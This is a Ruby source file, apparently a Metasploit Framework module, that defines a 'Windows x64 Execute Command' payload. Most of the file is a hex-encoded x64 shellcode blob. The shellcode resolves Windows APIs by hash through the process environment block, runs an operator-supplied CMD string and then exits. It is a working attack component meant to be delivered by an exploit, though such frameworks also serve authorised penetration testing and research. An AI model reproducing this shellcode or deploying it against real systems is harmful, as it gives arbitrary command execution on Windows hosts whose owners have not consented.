# frozen_string_literal: true
# -*- coding: binary -*-

module Msf
  ###
  #
  # Common command execution implementation for Windows.
  #
  ###

  module Payload::Windows::Exec_x64
    include Msf::Payload::Windows
    include Msf::Payload::Single

    def initialize(info = {})
      super(update_info(info,
                        'Name'          => 'Windows x64 Execute Command',
                        'Description'   => 'Execute an arbitrary command (Windows x64)',
                        'Author'        => [ 'sf' ],
                        'License'       => MSF_LICENSE,
                        'Platform'      => 'win',
                        'Arch'          => ARCH_X64,
                        'Payload'       =>
                          {
                            'Offsets' =>
                              {
                                'EXITFUNC' => [ 229, 'V' ]
                              },
                            'Payload' =>
                              "\xFC\x48\x83\xE4\xF0\xE8\xC0\x00\x00\x00\x41\x51\x41\x50\x52\x51" \
                              "\x56\x48\x31\xD2\x65\x48\x8B\x52\x60\x48\x8B\x52\x18\x48\x8B\x52" \
                              "\x20\x48\x8B\x72\x50\x48\x0F\xB7\x4A\x4A\x4D\x31\xC9\x48\x31\xC0" \
                              "\xAC\x3C\x61\x7C\x02\x2C\x20\x41\xC1\xC9\x0D\x41\x01\xC1\xE2\xED" \
                              "\x52\x41\x51\x48\x8B\x52\x20\x8B\x42\x3C\x48\x01\xD0\x8B\x80\x88" \
                              "\x00\x00\x00\x48\x85\xC0\x74\x67\x48\x01\xD0\x50\x8B\x48\x18\x44" \
                              "\x8B\x40\x20\x49\x01\xD0\xE3\x56\x48\xFF\xC9\x41\x8B\x34\x88\x48" \
                              "\x01\xD6\x4D\x31\xC9\x48\x31\xC0\xAC\x41\xC1\xC9\x0D\x41\x01\xC1" \
                              "\x38\xE0\x75\xF1\x4C\x03\x4C\x24\x08\x45\x39\xD1\x75\xD8\x58\x44" \
                              "\x8B\x40\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48\x44\x8B\x40\x1C\x49" \
                              "\x01\xD0\x41\x8B\x04\x88\x48\x01\xD0\x41\x58\x41\x58\x5E\x59\x5A" \
                              "\x41\x58\x41\x59\x41\x5A\x48\x83\xEC\x20\x41\x52\xFF\xE0\x58\x41" \
                              "\x59\x5A\x48\x8B\x12\xE9\x57\xFF\xFF\xFF\x5D\x48\xBA\x01\x00\x00" \
                              "\x00\x00\x00\x00\x00\x48\x8D\x8D\x01\x01\x00\x00\x41\xBA\x31\x8B" \
                              "\x6F\x87\xFF\xD5\xBB\xE0\x1D\x2A\x0A\x41\xBA\xA6\x95\xBD\x9D\xFF" \
                              "\xD5\x48\x83\xC4\x28\x3C\x06\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47" \
                              "\x13\x72\x6F\x6A\x00\x59\x41\x89\xDA\xFF\xD5"
                          }))
      register_options(
        [
          OptString.new('CMD', [ true, "The command string to execute" ])
        ], self.class
      )
    end

    def generate
      super + command_string + "\x00"
    end

    def command_string
      datastore['CMD'] || ''
    end
  end
end
